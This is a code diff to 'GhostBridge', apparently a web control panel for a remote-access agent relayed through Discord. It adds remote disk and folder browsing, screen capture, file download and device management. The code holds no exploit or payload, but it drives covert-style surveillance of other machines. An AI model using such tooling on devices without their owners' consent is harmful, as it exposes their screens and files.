@@ -10,9 +10,17 @@ import {
   Folder,
   File,
   Image as ImageIcon,
-  ArrowUp,
   Home,
   Lock,
+  Trash2,
+  Pencil,
+  FileText,
+  Music,
+  Video,
+  FileArchive,
+  FileCode,
+  FileJson,
+  ArrowUp,
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
@@ -50,11 +58,12 @@ export default function GhostBridge() {
   const { isDevMode, unlockDevMode } = useDevMode();
   const [devices, setDevices] = useState<Device[]>([]);
   const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
-  const [currentPath, setCurrentPath] = useState("C:\\");
-  const [files] = useState<FileEntry[]>([]);
+  const [currentPath, setCurrentPath] = useState("THIS_PC");
+  const [files, setFiles] = useState<FileEntry[]>([]);
+  const [disks, setDisks] = useState<any[]>([]);
   const [isLoadingFiles, setIsLoadingFiles] = useState(false);
   const [passwordInput, setPasswordInput] = useState("");
-  const [screenshot] = useState<string | null>(null); // Base64
+  const [screenshot, setScreenshot] = useState<string | null>(null); // Base64
   const [isScreenshotOpen, setIsScreenshotOpen] = useState(false);
 
   // --- 1. DEVICE POLLING ---
@@ -78,79 +87,191 @@ export default function GhostBridge() {
     return () => clearInterval(interval);
   }, [isDevMode]);
 
-  // --- 2. COMMAND HANDLER ---
+  // --- 2. COMMAND HANDLER (WITH POLLING) ---
   const sendCommand = async (cmd: string, args: string | null = null) => {
-    if (!selectedDevice) return;
+    if (!selectedDevice) return null;
 
-    // Kirim Command
-    await fetch("/api/ghost", {
-      method: "POST",
-      body: JSON.stringify({
-        action: "queue_command",
-        deviceId: selectedDevice.id,
-        command: cmd,
-        args: args,
-      }),
-    });
+    const startTime = Date.now();
 
-    // Polling Result (Simplistik: Cek DB Discord via API)
-    // Di real-world, pake WebSocket/Server Sent Events.
-    // Disini kita polling API Ghost setiap detik sampai dapat hasil tipe "RESULT"
-    // const pollResult = async () => {
-    // Implementasi sederhana:
-    // Di backend (route.ts), kita perlu endpoint untuk mengambil "Pesan Terakhir"
-    // Tapi karena keterbatasan code snippet, kita simulasi UI loading dulu.
-    // };
+    // 1. Queue Command
+    try {
+      await fetch("/api/ghost", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          action: "queue_command",
+          deviceId: selectedDevice.id,
+          command: cmd,
+          args: args,
+        }),
+      });
+
+      // 2. Poll for Result
+      // Kita cek tiap 1 detik selama maks 15 detik
+      for (let i = 0; i < 15; i++) {
+        await new Promise((r) => setTimeout(r, 1500));
+
+        const res = await fetch(
+          `/api/ghost?action=get_result&deviceId=${selectedDevice.id}`,
+        );
+        if (res.ok) {
+          const result = await res.json();
+
+          // Pastikan result ini untuk command yang baru saja kita kirim (cek timestamp)
+          if (result && result.timestamp > startTime) {
+            return result;
+          }
+        }
+      }
+      throw new Error("Agent request timeout");
+    } catch (error: any) {
+      toast.error(error.message || "Failed to execute command");
+      return null;
+    }
   };
 
   // --- FILE EXPLORER LOGIC ---
+  const fetchDisks = useCallback(async () => {
+    if (!selectedDevice) return;
+    setIsLoadingFiles(true);
+    const toastId = toast.loading("Fetching available disks...");
+
+    try {
+      const result = await sendCommand("LIST_DISKS");
+      if (result && result.status === "DONE") {
+        setDisks(result.data.disks);
+        setCurrentPath("THIS_PC");
+        toast.success("Disks loaded", { id: toastId });
+      } else {
+        toast.error("Failed to fetch disks", { id: toastId });
+      }
+    } catch (e) {
+      toast.error("An error occurred", { id: toastId });
+    } finally {
+      setIsLoadingFiles(false);
+    }
+  }, [selectedDevice]);
+
   const fetchDirectory = useCallback(
     async (path: string) => {
       if (!selectedDevice) return;
+      if (path === "THIS_PC") {
+        fetchDisks();
+        return;
+      }
+
       setIsLoadingFiles(true);
-      setCurrentPath(path);
+      const toastId = toast.loading(`Scanning: ${path}`);
 
-      // 1. Kirim Command LS
-      await sendCommand("LS", path);
+      try {
+        const result = await sendCommand("LS", path);
 
-      // 2. Polling manual cari response (Ini agak tricky tanpa socket, kita gunakan toast loading)
-      const toastId = toast.loading("Fetching directory...");
-
-      // Simulasi Polling (Client check Discord Messages lewat API)
-      // Kita reuse endpoint GET /api/ghost?action=poll_result&targetId=...
-      // (Anda perlu menambah logika ini di backend jika ingin sempurna, atau gunakan struktur file yang ada)
-
-      // TEMPORARY MOCKUP UNTUK DEMO UI (Karena backend polling kompleks)
-      // Di produksi, Agent Rust akan kirim JSON ke Discord, Frontend baca Discord message terbaru.
-      // Kita asumsikan backend sudah handle "response" post dari Agent.
-
-      // Di sini kita harus listen ke API untuk melihat apakah ada pesan baru dari ID device ini
-      // yg bertipe "RESULT" dan berisi data "files".
-
-      // Logic Polling Result Sederhana:
-      let attempts = 0;
-      const checkResult = setInterval(async () => {
-        attempts++;
-        if (attempts > 10) {
-          clearInterval(checkResult);
-          toast.error("Timeout waiting for agent", { id: toastId });
-          setIsLoadingFiles(false);
-          return;
+        if (result && result.status === "DONE") {
+          setFiles(result.data.files);
+          setCurrentPath(result.data.current_path);
+          toast.success("Directory loaded", { id: toastId });
+        } else if (result && result.status === "ERROR") {
+          toast.error(result.data.message, { id: toastId });
+        } else {
+          toast.error("Failed to fetch directory", { id: toastId });
         }
-
-        // Kita modifikasi GET route untuk support fetch result
-        // Untuk sekarang, kita asumsi data masuk.
-        // Implementasi real butuh endpoint khusus.
-      }, 1000);
+      } catch (e) {
+        toast.error("An error occurred", { id: toastId });
+      } finally {
+        setIsLoadingFiles(false);
+      }
     },
-    [selectedDevice],
+    [selectedDevice, fetchDisks],
   );
+
+  // Auto-load when device selected
+  useEffect(() => {
+    if (selectedDevice) {
+      fetchDisks();
+    }
+  }, [selectedDevice, fetchDisks]);
 
   // --- SCREENSHOT LOGIC ---
   const handleScreenshot = async () => {
-    toast.info("Requesting screenshot...");
-    await sendCommand("SCREENSHOT");
-    // Logic polling sama seperti file explorer untuk mendapatkan base64 image
+    if (!selectedDevice) return;
+    const toastId = toast.loading("Capturing remote screen...");
+
+    try {
+      const result = await sendCommand("SCREENSHOT");
+
+      if (result && result.status === "DONE") {
+        setScreenshot(result.data.image || result.data.url);
+        setIsScreenshotOpen(true);
+        toast.success("Screenshot captured", { id: toastId });
+      } else {
+        toast.error(result?.data?.message || "Capture failed", { id: toastId });
+      }
+    } catch (e) {
+      toast.error("Capture failed", { id: toastId });
+    }
+  };
+
+  const handleDownloadFile = async (fileName: string) => {
+    if (!selectedDevice) return;
+    const fullPath = joinPath(currentPath, fileName);
+    const toastId = toast.loading(`Preparing download: ${fileName}`);
+
+    try {
+      const result = await sendCommand("GET_FILE", fullPath);
+
+      if (result && result.status === "DONE") {
+        window.open(result.data.url, "_blank");
+        toast.success("Download link ready", { id: toastId });
+      } else {
+        toast.error(result?.data?.message || "Download failed", {
+          id: toastId,
+        });
+      }
+    } catch (e) {
+      toast.error("Download failed", { id: toastId });
+    }
+  };
+
+  // --- CRUD ACTIONS ---
+  const handleDeleteDevice = async (e: React.MouseEvent, deviceId: string) => {
+    e.stopPropagation();
+    if (!confirm("Are you sure you want to remove this device registry?"))
+      return;
+
+    try {
+      const res = await fetch("/api/ghost", {
+        method: "POST",
+        body: JSON.stringify({ action: "delete_device", deviceId }),
+      });
+      if (res.ok) {
+        toast.success("Device removed");
+        setDevices((prev) => prev.filter((d) => d.id !== deviceId));
+        if (selectedDevice?.id === deviceId) setSelectedDevice(null);
+      }
+    } catch (e) {
+      toast.error("Failed to delete");
+    }
+  };
+
+  const handleRenameDevice = async (e: React.MouseEvent, deviceId: string) => {
+    e.stopPropagation();
+    const newName = prompt("Enter new device name:");
+    if (!newName) return;
+
+    try {
+      const res = await fetch("/api/ghost", {
+        method: "POST",
+        body: JSON.stringify({ action: "update_device", deviceId, newName }),
+      });
+      if (res.ok) {
+        toast.success("Device renamed");
+        setDevices((prev) =>
+          prev.map((d) => (d.id === deviceId ? { ...d, name: newName } : d)),
+        );
+      }
+    } catch (e) {
+      toast.error("Failed to rename");
+    }
   };
 
   // --- ADMIN GUARD ---
@@ -222,7 +343,7 @@ export default function GhostBridge() {
                 key={dev.id}
                 onClick={() => setSelectedDevice(dev)}
                 className={cn(
-                  "cursor-pointer rounded-lg border border-transparent p-3 transition-all",
+                  "group cursor-pointer rounded-lg border border-transparent p-3 transition-all",
                   selectedDevice?.id === dev.id
                     ? "border-teal-500/30 bg-teal-500/10 text-teal-400"
                     : "hover:bg-neutral-800",
@@ -243,17 +364,33 @@ export default function GhostBridge() {
                     {dev.is_online ? "ONLINE" : "OFFLINE"}
                   </Badge>
                 </div>
-                <div className="truncate font-mono text-xs text-neutral-500">
+                <div className="truncate font-mono text-[10px] text-neutral-600">
                   {dev.id}
                 </div>
-                <div className="mt-2 flex gap-3 text-xs text-neutral-400">
-                  <span className="flex items-center gap-1">
-                    <Cpu className="h-3 w-3" /> {dev.platform}
-                  </span>
-                  <span className="flex items-center gap-1">
-                    <HardDrive className="h-3 w-3" /> {dev.ram_usage} /{" "}
-                    {dev.ram_total} MB
-                  </span>
+                <div className="mt-2 flex items-center justify-between">
+                  <div className="flex gap-3 text-xs text-neutral-500">
+                    <span className="flex items-center gap-1">
+                      <Cpu className="h-3 w-3" /> {dev.platform}
+                    </span>
+                  </div>
+                  <div className="flex gap-1 opacity-20 transition-opacity group-hover:opacity-100">
+                    <Button
+                      variant="ghost"
+                      size="icon"
+                      className="h-7 w-7 text-neutral-500 hover:text-teal-400"
+                      onClick={(e) => handleRenameDevice(e, dev.id)}
+                    >
+                      <Pencil className="h-3 w-3" />
+                    </Button>
+                    <Button
+                      variant="ghost"
+                      size="icon"
+                      className="h-7 w-7 text-neutral-500 hover:text-red-500"
+                      onClick={(e) => handleDeleteDevice(e, dev.id)}
+                    >
+                      <Trash2 className="h-3 w-3" />
+                    </Button>
+                  </div>
                 </div>
               </div>
             ))}
@@ -299,7 +436,7 @@ export default function GhostBridge() {
                 <Button
                   variant="secondary"
                   size="icon"
-                  onClick={() => fetchDirectory("C:\\")}
+                  onClick={() => fetchDirectory("THIS_PC")}
                 >
                   <Home className="h-4 w-4" />
                 </Button>
@@ -307,11 +444,19 @@ export default function GhostBridge() {
                   variant="secondary"
                   size="icon"
                   onClick={() => {
+                    if (currentPath === "THIS_PC") return;
                     // Logic naik satu folder (split path)
-                    const parts = currentPath.split("\\");
+                    const parts = currentPath
+                      .split("\\")
+                      .filter((p) => p !== "");
+                    if (parts.length <= 1) {
+                      fetchDirectory("THIS_PC");
+                      return;
+                    }
                     parts.pop(); // Remove current
-                    if (parts.length === 1 && parts[0] === "") return; // Root protection
-                    fetchDirectory(parts.join("\\") || "C:\\");
+                    let newPath = parts.join("\\");
+                    if (!newPath.endsWith("\\")) newPath += "\\";
+                    fetchDirectory(newPath);
                   }}
                 >
                   <ArrowUp className="h-4 w-4" />
@@ -340,59 +485,53 @@ export default function GhostBridge() {
                   </div>
                 ) : (
                   <div className="grid grid-cols-2 gap-2 md:grid-cols-4 lg:grid-cols-6">
-                    {/* MOCKUP FILES FOR UI DEMO */}
-                    {files.length === 0 && (
-                      <>
+                    {currentPath === "THIS_PC" ? (
+                      disks.map((disk, i) => (
                         <div
-                          className="flex cursor-pointer flex-col items-center gap-2 rounded border border-neutral-800 bg-neutral-900 p-4 text-center hover:bg-neutral-800"
-                          onClick={() =>
-                            fetchDirectory(currentPath + "\\Windows")
-                          }
+                          key={i}
+                          className="group flex cursor-pointer flex-col items-center gap-2 rounded border border-transparent p-3 text-center transition-all hover:border-neutral-700 hover:bg-neutral-800"
+                          onClick={() => fetchDirectory(disk.mount_point)}
                         >
-                          <Folder className="h-10 w-10 text-yellow-500" />
-                          <span className="w-full truncate text-xs">
-                            Windows
+                          <HardDrive className="h-8 w-8 text-teal-500 transition-transform group-hover:scale-110" />
+                          <span className="w-full truncate text-xs font-bold">
+                            {disk.name || `Local Disk (${disk.mount_point})`}
+                          </span>
+                          <span className="text-[10px] text-neutral-500">
+                            {disk.available_space} free of {disk.total_space}
                           </span>
                         </div>
-                        <div className="flex cursor-pointer flex-col items-center gap-2 rounded border border-neutral-800 bg-neutral-900 p-4 text-center hover:bg-neutral-800">
-                          <File className="h-10 w-10 text-blue-500" />
-                          <span className="w-full truncate text-xs">
-                            secret.txt
-                          </span>
-                        </div>
-                        {/* NOTE: Nanti ini diisi state `files` */}
+                      ))
+                    ) : (
+                      <>
+                        {files.map((file, i) => (
+                          <div
+                            key={i}
+                            className="group flex cursor-pointer flex-col items-center gap-2 rounded border border-transparent p-3 text-center transition-all hover:border-neutral-700 hover:bg-neutral-800"
+                            onClick={() => {
+                              if (file.kind === "dir")
+                                fetchDirectory(
+                                  joinPath(currentPath, file.name),
+                                );
+                              else handleDownloadFile(file.name);
+                            }}
+                          >
+                            {file.kind === "dir" ? (
+                              <Folder className="h-8 w-8 text-yellow-500 transition-transform group-hover:scale-110" />
+                            ) : (
+                              getFileIcon(file.name)
+                            )}
+                            <span className="w-full truncate text-xs select-none">
+                              {file.name}
+                            </span>
+                            {file.kind === "file" && (
+                              <span className="text-[10px] text-neutral-600">
+                                {file.size}
+                              </span>
+                            )}
+                          </div>
+                        ))}
                       </>
                     )}
-
-                    {files.map((file, i) => (
-                      <div
-                        key={i}
-                        className="group flex cursor-pointer flex-col items-center gap-2 rounded border border-transparent p-3 text-center transition-all hover:border-neutral-700 hover:bg-neutral-800"
-                        onClick={() => {
-                          if (file.kind === "dir")
-                            fetchDirectory(`${currentPath}\\${file.name}`);
-                          else
-                            sendCommand(
-                              "GET_FILE",
-                              `${currentPath}\\${file.name}`,
-                            );
-                        }}
-                      >
-                        {file.kind === "dir" ? (
-                          <Folder className="h-8 w-8 text-yellow-500 transition-transform group-hover:scale-110" />
-                        ) : (
-                          <File className="h-8 w-8 text-blue-500 transition-transform group-hover:scale-110" />
-                        )}
-                        <span className="w-full truncate text-xs select-none">
-                          {file.name}
-                        </span>
-                        {file.kind === "file" && (
-                          <span className="text-[10px] text-neutral-600">
-                            {file.size}
-                          </span>
-                        )}
-                      </div>
-                    ))}
                   </div>
                 )}
               </div>
@@ -431,3 +570,70 @@ export default function GhostBridge() {
     </div>
   );
 }
+
+const getFileIcon = (name: string) => {
+  const ext = name.split(".").pop()?.toLowerCase();
+  switch (ext) {
+    case "txt":
+    case "md":
+    case "doc":
+    case "docx":
+    case "pdf":
+      return (
+        <FileText className="h-8 w-8 text-blue-400 transition-transform group-hover:scale-110" />
+      );
+    case "mp3":
+    case "wav":
+    case "flac":
+      return (
+        <Music className="h-8 w-8 text-purple-400 transition-transform group-hover:scale-110" />
+      );
+    case "mp4":
+    case "mkv":
+    case "avi":
+      return (
+        <Video className="h-8 w-8 text-rose-400 transition-transform group-hover:scale-110" />
+      );
+    case "jpg":
+    case "jpeg":
+    case "png":
+    case "gif":
+    case "webp":
+      return (
+        <ImageIcon className="h-8 w-8 text-emerald-400 transition-transform group-hover:scale-110" />
+      );
+    case "zip":
+    case "rar":
+    case "7z":
+    case "tar":
+    case "gz":
+      return (
+        <FileArchive className="h-8 w-8 text-amber-400 transition-transform group-hover:scale-110" />
+      );
+    case "js":
+    case "ts":
+    case "py":
+    case "rs":
+    case "cpp":
+    case "cs":
+    case "html":
+    case "css":
+      return (
+        <FileCode className="h-8 w-8 text-orange-400 transition-transform group-hover:scale-110" />
+      );
+    case "json":
+      return (
+        <FileJson className="h-8 w-8 text-yellow-400 transition-transform group-hover:scale-110" />
+      );
+    default:
+      return (
+        <File className="h-8 w-8 text-blue-500 transition-transform group-hover:scale-110" />
+      );
+  }
+};
+
+const joinPath = (base: string, name: string) => {
+  if (base === "THIS_PC") return name;
+  if (base.endsWith("\\")) return base + name;
+  return base + "\\" + name;
+};
